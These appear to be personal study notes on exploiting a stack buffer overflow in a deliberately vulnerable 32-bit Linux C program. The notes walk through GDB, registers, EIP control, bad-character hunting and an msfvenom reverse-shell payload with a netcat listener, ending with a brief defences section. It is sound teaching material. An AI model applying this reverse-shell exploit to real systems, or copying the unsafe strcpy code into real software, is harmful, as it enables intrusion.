---
title: Notes | Stack-Based Buffer Overflow - Linux
author: Zeropio
date: 2022-07-21
categories: [Notes, Vulnerabilities]
tags: [linux, buffer]
permalink: /notes/vulnerabilities/buffer-overflow-linux
---

# Fundamentals 

Memory exceptions are the operating system's reaction to an error in existing software or during the execution of these. Programming errors often occur, leading to buffer overflows due to inattention when programming with low abstract languages such as C or C++. **Buffer overflows** are errors that allow data that is too large to fit into a buffer of the operating system's memory that is not large enough, thereby overflowing this buffer. As a result of this mishandling, the memory of other functions of the executed program is overwritten, potentially creating a security vulnerability.

Such a program (binary file), is a general executable file stored on a data storage medium. There are several different file formats for such executable binary files. For example, the Portable Executable Format (PE) is used on Microsoft platforms. Another format for executable files is the Executable and Linking Format (ELF), supported by almost all modern UNIX variants. If the linker loads such an executable binary file and the program will be executed, the corresponding program code will be loaded into the main memory and then executed by the CPU.

## Vulnerable Program 

This program called `bow.c` is a vulnerable example:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```

Where `strcpy()` is a vulnerable function. Modern OS have protection against this (like **Address Space Layout Randomizaion**, ASLR). To disable ASLR:
```console
zero@pio$ sudo su 
root@pio$ echo 0 > /proc/sys/kernel/randomize_va_space
root@pio$ cat /proc/sys/kernel/randomize_va_space

0
```

Next compile the code into a *32bit ELF binary*:
```console
zero@pio$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
zero@pio$ file bow32 | tr "," "\n"

bow: ELF 32-bit LSB shared object
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071
 not stripped
```

There are some vulnerable functions in C, for example:
- `strcpy`
- `gets`
- `sprintf`
- `scanf`
- `strcat`

## GDB 

GDB is the **GNU Debugger**, standard debugger for Unix Systems. It can work with many language as C, C++, Objective-C, FORTRAN, Java... 
We use GDB to view the created binary on the assembler level. Once we have executed the binary with GDB, we can disassemble the program's main function.
```
zero@pio$ gdb -q bow32

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    0x4(%esp),%ecx
   0x00000586 <+4>: 	and    $0xfffffff0,%esp
   0x00000589 <+7>: 	pushl  -0x4(%ecx)
   0x0000058c <+10>:	push   %ebp
   0x0000058d <+11>:	mov    %esp,%ebp
   0x0000058f <+13>:	push   %ebx
   0x00000590 <+14>:	push   %ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    $0x1a3e,%ebx
   0x0000059c <+26>:	mov    %ecx,%eax
   0x0000059e <+28>:	mov    0x4(%eax),%eax
   0x000005a1 <+31>:	add    $0x4,%eax
   0x000005a4 <+34>:	mov    (%eax),%eax
   0x000005a6 <+36>:	sub    $0xc,%esp
   0x000005a9 <+39>:	push   %eax
   0x000005aa <+40>:	call   0x54d <bowfunc>
   0x000005af <+45>:	add    $0x10,%esp
   0x000005b2 <+48>:	sub    $0xc,%esp
   0x000005b5 <+51>:	lea    -0x1974(%ebx),%eax
   0x000005bb <+57>:	push   %eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    $0x10,%esp
   0x000005c4 <+66>:	mov    $0x1,%eax
   0x000005c9 <+71>:	lea    -0x8(%ebp),%esp
   0x000005cc <+74>:	pop    %ecx
   0x000005cd <+75>:	pop    %ebx
   0x000005ce <+76>:	pop    %ebp
   0x000005cf <+77>:	lea    -0x4(%ecx),%esp
   0x000005d2 <+80>:	ret    
End of assembler dump.
```

The firt column represent the **memory address** (in hexadecimal). The numbers with the plus (+) represent the **address jump** in memory bytes. Next the **assembler instructions** (**mnemonics**), with **registers** and their **operation suffixes**. The current syntax is **AT&T**, which we can recognize by the `%` and `$` characters.

| **Memory Address**    | **Address Jump**    | **Assembler Instruction**   | **Operation Suffixes** |
|---------------- | --------------- | --------------- | ---------------- |
| 0x00000582    | <+0>:    | lea    | 0x4(%esp),%ecx |
| 0x00000586 | <+4>:	| and | $0xfffffff0,%esp |
| ... | ... | ... | ... |

The **Intel** syntax is easier to read:
```
(gdb) set disassembly-flavor intel
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:	lea    ecx,[esp+0x4]
   0x00000586 <+4>:	and    esp,0xfffffff0
   0x00000589 <+7>:	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
```

We can change the GDB syntax:
```console
zero@pio$ echo 'set disassembly-flavor intel' > ~/.gdbinit
```

And now:
```
zero@pio$ gdb ./bow32 -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    ecx,[esp+0x4]
   0x00000586 <+4>: 	and    esp,0xfffffff0
   0x00000589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x000005a1 <+31>:	add    eax,0x4
   0x000005a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x000005a6 <+36>:	sub    esp,0xc
   0x000005a9 <+39>:	push   eax
   0x000005aa <+40>:	call   0x54d <bowfunc>
   0x000005af <+45>:	add    esp,0x10
   0x000005b2 <+48>:	sub    esp,0xc
   0x000005b5 <+51>:	lea    eax,[ebx-0x1974]
   0x000005bb <+57>:	push   eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    esp,0x10
   0x000005c4 <+66>:	mov    eax,0x1
   0x000005c9 <+71>:	lea    esp,[ebp-0x8]
   0x000005cc <+74>:	pop    ecx
   0x000005cd <+75>:	pop    ebx
   0x000005ce <+76>:	pop    ebp
   0x000005cf <+77>:	lea    esp,[ecx-0x4]
   0x000005d2 <+80>:	ret    
End of assembler dump.
```

The difference between the AT&T and Intel syntax is not only in the presentation of the instructions with their symbols but also in the order and direction in which the instructions are executed and read. With the following example:
```
   0x0000058d <+11>:	mov    ebp,esp
```

- **Intel Syntax**

| **Instruction**    | **Destination**    | **Source**    |
|---------------- | --------------- | --------------- |
| mov   |ebp    | esp    |


- **AT&T Syntax**

| **Instruction**    | **Source**    | **Destination**    |
|---------------- | --------------- | --------------- |
| mov   | %esp    | %ebp   |


## CPU Registers 

Registers are the essential components of a CPU. Almost all registers offer a small amount of storage space where data can be temporarily stored. Can be divided in *General registers*, *Control registers* and *Segment registers*. The most critical registers we need are the General registers. In these, there are further subdivisions into *Data registers*, *Pointer registers*, and *Index registers*.

- **Data registers**

| **32-bit Register**    | **64-bit Register**    | **Description**    |
|---------------- | --------------- | --------------- |
| EAX   | RAX   | Accumulator is used in input/output and for arithmetic operations    |
| EBX | RBX | Base is used in indexed addressing |
| ECX | RCX | Counter is used to rotate instructions and count loops |
| EDX | RDX | Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values |

- **Pointer registers** 

| **32-bit Register**    | **64-bit Register**    | **Description**    |
|---------------- | --------------- | --------------- |
| EIP    | RIP    | Instruction Pointer stores the offset address of the next instruction to be executed    |
| ESP | RSP | Stack Pointer points to the top of the stack |
| EBP | RBP | Base Pointer is also known as **Stack Base Pointer** or **Frame Pointer** thats points to the base of the stack |

### Stack Frames 

Since the stack starts with a high address and grows down to low memory addresses as values are added, the **Base Pointer** points to the beginning (base) of the stack in contrast to the **Stack Pointer**, which points to the top of the stack. As the stack grows, it is logically divided into regions called Stack Frames, which allocate the required memory in the stack for the corresponding function. A stack frame defines a frame of data with the beginning (**EBP**) and the end (**ESP**) that is pushed onto the stack when a function is called.

Since the stack memory is built on a Last-In-First-Out (**LIFO**) data structure, the first step is to store the previous **EBP** position on the stack, which can be restored after the function completes. If we now look at the bowfunc function, it looks like following in GDB:
```
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret    
```

The **EBP** in the stack frame is set first when a function is called and contains the **EBP** of the previous stack frame. Next, the value of the **ESP** is copied to the **EBP**, creating a new stack frame.

```
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret
```

Then some space is created in the stack, moving the **ESP** to the top for the operations and variables needed and processed.

These three functions are called **Prologue**.
```
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:	    mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 # <---- 3. Moves ESP to the top
   <...SNIP...>
   0x00000580 <+51>:	leave  
   0x00000581 <+52>:	ret
```

For getting out of the stack frame, the opposite is done, the **Epilogue**. During the epilogue, the **ESP** is replaced by the current **EBP**, and its value is reset to the value it had before in the prologue.
```
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:	    push   ebp       
   0x0000054e <+1>:	    mov    ebp,esp   
   0x00000550 <+3>:	    push   ebx
   0x00000551 <+4>:	    sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:	leave  # <----------------------
   0x00000581 <+52>:	ret    # <--- Leave stack frame
```

Another important point concerning the representation of the assembler is the naming of the registers. This depends on the format in which the binary was compiled. 

| **Register 32-bit**    | **Register 64-bit**    | **Description**    |
|---------------- | --------------- | --------------- |
| ESI    | RSI    | Source Index is used as a pointer from a source for string operations    |
| EDI | RDI | 	Destination is used as a pointer to a destination for string operations |


We have used GCC to compile the bow.c code in 32-bit format. Now let's compile the same code into a 64-bit format.
```console
zero@pio$ gcc bow.c -o bow64 -fno-stack-protector -z execstack -m64
zero@pio$ file bow64 | tr "," "\n"

bow64: ELF 64-bit LSB shared object
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=9503477016e8604e808215b4babb250ed25a7b99
 not stripped
```

Looking at the assembler code:
```
zero@pio$ gdb -q bow64

Reading symbols from bow64...(no debugging symbols found)...done.
(gdb) disas main

Dump of assembler code for function main:
   0x00000000000006bc <+0>: 	push   rbp
   0x00000000000006bd <+1>: 	mov    rbp,rsp
   0x00000000000006c0 <+4>: 	sub    rsp,0x10
   0x00000000000006c4 <+8>:  	mov    DWORD PTR [rbp-0x4],edi
   0x00000000000006c7 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000000006cb <+15>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000000006cf <+19>:	add    rax,0x8
   0x00000000000006d3 <+23>:	mov    rax,QWORD PTR [rax]
   0x00000000000006d6 <+26>:	mov    rdi,rax
   0x00000000000006d9 <+29>:	call   0x68a <bowfunc>
   0x00000000000006de <+34>:	lea    rdi,[rip+0x9f]
   0x00000000000006e5 <+41>:	call   0x560 <puts@plt>
   0x00000000000006ea <+46>:	mov    eax,0x1
   0x00000000000006ef <+51>:	leave  
   0x00000000000006f0 <+52>:	ret    
End of assembler dump.
```

The most important instruction for us right now is the **call** instruction. The **call** instruction is used to call a function and performs two operations:
1. it pushes the return address onto the **stack** so that the execution of the program can be continued after the function has successfully fulfilled its goal
2. it changes the **Instruction Pointer** (**EIP**) to the call destination and starting execution there

With the Intel Syntax:
```
zero@pio$ gdb ./bow32 -q

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    ecx,[esp+0x4]
   0x00000586 <+4>: 	and    esp,0xfffffff0
   0x00000589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x000005a1 <+31>:	add    eax,0x4
   0x000005a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x000005a6 <+36>:	sub    esp,0xc
   0x000005a9 <+39>:	push   eax
   0x000005aa <+40>:	call   0x54d <bowfunc>		# <--- CALL function
```

## Endianness 

During load and save operations in registers and memories, the bytes are read in a different order. This byte order is called **endianness**. Endianness is distinguished between the **little-endian** format and the **big-endian** format. Big-endian and little-endian are about the order of valence. In big-endian, the digits with the **highest valence** are initially. In little-endian, the digits with the **lowest valence** are at the beginning. Mainframe processors use the big-endian format, some **RISC architectures**, minicomputers, and in TCP/IP networks, the byte order is also in big-endian format.

With the following example:
- Address: `0xffff0000`
- Word: `\xAA\xBB\xCC\xDD`


| **Memory Address**	    | **0xffff0000**    | **0xffff0001**    | **0xffff0002** | **0xffff0003** |
|---------------- | --------------- | --------------- | -------------- | ------------------ |
| Big-Endian	    | AA    | BB    | CC | DD |
| Little-Endian | DD | CC | BB | AA |

---

# Exploit 

## Take Control of EIP 

One of the most important aspects of a stack-based buffer overflow is to get the **Instruction Pointer** (**EIP**) under control, so we can tell it to which address it should jump. This will make the **EIP** point to the address where our **shellcode** starts and causes the CPU to execute it.

We can execute commands in GDB using Python, which serves us directly as input.

### Segmentation Fault

If we insert 1200 "U"s (hex "**55**") as input, we can see from the register information that we have overwritten the **EIP**. As far as we know, the **EIP** points to the next instruction to be executed.
```
zero@pio$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

```
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

### Determine The Offset 

The offset is used to determine how many bytes are needed to overwrite the buffer and how much space we have around our shellcode. Shellcode is a program code that contains instructions for an operation that we want the CPU to perform.

Let's use the script **pattern_create** to determinate the exact number of bytes to reach the EIP:
```console
zero@pio$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
zero@pio$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
```

Now replace the 1200 "U"s with the pattern:
```
gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```

We see that the EIP displays a different memory address:
```
(gdb) info registers eip

eip            0x69423569	0x69423569
```

We can use another MSF tool called "**pattern_offset**" to calculate the exact number of characters (offset) needed to advance to the **EIP**:
```
zero@pio$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```

If we now use precisely this number of bytes for our "U"s, we should land exactly on the **EIP**. To overwrite it and check if we have reached it as planned, we can add 4 more bytes with "\x66" and execute it to ensure we control the **EIP**.
```
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Now we see that we have overwritten the **EIP** with our "\x66" characters. Next, we have to find out how much space we have for our shellcode, which then executes the commands we intend.

## Determine the Length for Shellcode 

It is trendy and useful for us to exploit such a vulnerability to get a reverse shell. First, we have to find out approximately how big our shellcode will be that we will insert, and for this, we will use **msfvenom**.
```
zero@pio$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c 

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
```

We now know that our payload will be about 68 bytes. As a precaution, we should try to take a larger range if the shellcode increases due to later specifications.

Often it can be useful to insert some **No Operation Instruction** (NOPS) before our shellcode begins so that it can be executed cleanly. Let us briefly summarize what we need for this:
- We need a total of 1040 bytes to get to the **EIP**
- Here, we can use an additional 100 bytes of **NOPs**
- 150 bytes for our shellcode 

The length will be:
```
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4'
```

## Identification of Bad Characters 

Previously in UNIX-like operating systems, binaries started with two bytes containing a "**magic number**" that determines the file type. In the beginning, this was used to identify object files for different platforms. Gradually this concept was transferred to other files, and now almost every file contains a magic number.

These reserved characters, also known as **bad characters** can vary, but often we will see characters like this:
- `\x00` - Null Byte
- `\x0A` - Line Feed
- `\x0D` - Carriage Return
- `\xFF` - Form Feed

To calculate the number of bytes in our CHARS variable, we can use bash by replacing the "\x" with space and then use wc to count the words:
```console
zero@pio$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

zero@pio$ echo $CHARS | sed 's/\\x/ /g' | wc -w

256
```

This string is 256 bytes long. So we need to calculate our buffer again. If we execute it now, the program will crash without giving us the possibility to follow what happens in the memory. So we will set a breakpoint at the corresponding function so that the execution stops at this point, and we can analyze the memory's content.
```
(gdb) disas main
Dump of assembler code for function main:
   0x56555582 <+0>: 	lea    ecx,[esp+0x4]
   0x56555586 <+4>: 	and    esp,0xfffffff0
   0x56555589 <+7>: 	push   DWORD PTR [ecx-0x4]
   0x5655558c <+10>:	push   ebp
   0x5655558d <+11>:	mov    ebp,esp
   0x5655558f <+13>:	push   ebx
   0x56555590 <+14>:	push   ecx
   0x56555591 <+15>:	call   0x56555450 <__x86.get_pc_thunk.bx>
   0x56555596 <+20>:	add    ebx,0x1a3e
   0x5655559c <+26>:	mov    eax,ecx
   0x5655559e <+28>:	mov    eax,DWORD PTR [eax+0x4]
   0x565555a1 <+31>:	add    eax,0x4
   0x565555a4 <+34>:	mov    eax,DWORD PTR [eax]
   0x565555a6 <+36>:	sub    esp,0xc
   0x565555a9 <+39>:	push   eax
   0x565555aa <+40>:	call   0x5655554d <bowfunc>		# <---- bowfunc Function
   0x565555af <+45>:	add    esp,0x10
   0x565555b2 <+48>:	sub    esp,0xc
   0x565555b5 <+51>:	lea    eax,[ebx-0x1974]
   0x565555bb <+57>:	push   eax
   0x565555bc <+58>:	call   0x565553e0 <puts@plt>
   0x565555c1 <+63>:	add    esp,0x10
   0x565555c4 <+66>:	mov    eax,0x1
   0x565555c9 <+71>:	lea    esp,[ebp-0x8]
   0x565555cc <+74>:	pop    ecx
   0x565555cd <+75>:	pop    ebx
   0x565555ce <+76>:	pop    ebp
   0x565555cf <+77>:	lea    esp,[ecx-0x4]
   0x565555d2 <+80>:	ret    
End of assembler dump.
```

Let's add the command `break`:
```
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

Now we can execute it. Send the char:
```
(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in input

Breakpoint 1, 0x56555551 in bowfunc ()
```

Now we can look at the **Stack**:
```
(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				 # |---> "\x55"s begin

0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

Here we recognize at which address our "\x55" begins. From here, we can go further down and look for the place where our CHARS start.
```
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
												 # |---> CHARS begin

0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

If we look closely at it, we will see that it starts with `\x01` instead of `\x00`. We have already seen the warning during the execution that the **null byte** in our input was ignored. So we can note this character, remove it from our variable CHARS and adjust the number of our `\x55`.
 
Let's see how many we need:
```
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 255 - 4) = 781

# "\x00" removed: 256 - 1 = 255 bytes
 CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
 
   EIP = "\x66" * 4
```

Now send the CHARS without Null Byte:
```
(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

The Stack now will look:
```
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x09" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

Here it depends on our bytes' correct order in the variable CHARS to see if any character changes, interrupts, or skips the order. Now we recognize that after the `x08`, we encounter the `\x00` instead of the `\x09` as expected. This tells us that this character is not allowed here and must be removed accordingly.

Let's calculate again:
```
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 254 - 4) = 782	

# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```

Now send the CHAR without `\x00` and `\x09`:
```
(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

The Stack now will be:
```
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x0a" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

**This process must be repeated until all characters that could interrupt the flow are removed.**

## Generating Shellcode 

Before we generate our shellcode, we have to make sure that the individual components and properties match the target system. Therefore we have to pay attention to the following areas:
- Architecture
- Platform
- Bad Characters

To generate with **msfvenom**:
```
zero@pio$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```

> We must eliminate the chars with `--bad-chars "<chars"`
{: .prompt-info}


Let's replace our CHAR by the Shellcode:
```
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

Now send it and check it:
```
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc () 

gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```

> We can see all the info with the command `info proc all`
{: .prompt-tip}

## Identification of the Return Address

To exploit it, first start a nc:
```console
zero@pio$ nc -lnvp 31337
```

Change the **EIP** by some address after `\x50` (for example from `0xffffd64c` -> `\x4c\xd6\xff\xff`).

In the gbd:
```
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

---

# Prevention Techniques and Mechanisms

The best prevention are:

## Canaries 

The **canaries** are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.

## ASLR

